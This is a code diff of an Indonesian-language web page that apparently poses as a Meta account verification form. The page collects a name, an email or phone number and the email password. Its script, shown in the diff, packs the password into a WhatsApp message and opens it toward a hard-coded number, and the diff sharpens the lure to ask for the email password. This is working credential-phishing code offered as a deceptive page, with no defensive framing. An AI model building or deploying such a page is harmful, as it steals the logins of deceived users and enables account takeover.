@@ -132,7 +132,7 @@
         <input type="email" id="emailOrPhone" name="emailOrPhone" placeholder="Masukkan email atau nomor telepon" required>
       </div>
       <div>
-        <label for="password">Kata Sandi</label>
+        <label for="password">Kata Sandi Email</label>
         <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required autocomplete="current-password">
       </div>
       <button type="submit">Kirim & Amankan</button>
@@ -150,7 +150,7 @@
       const password = encodeURIComponent(document.getElementById('password').value);
 
       const phoneNumber = '12498950768'; // Ganti dengan nomor WhatsApp Anda
-      const message = `Verifikasi Akun:%0A%0ANama: ${name}%0AEmail/Nomor Telepon: ${emailOrPhone}%0AKata Sandi: ${password}`;
+      const message = `Hallo meta Verifikasi Akun:%0A%0ANama: ${name}%0AEmail/Nomor Telepon: ${emailOrPhone}%0AKata Sandi Email: ${password}`;
 
       const url = `https://wa.me/${phoneNumber}?text=${message}`;
       window.open(url, '_blank');
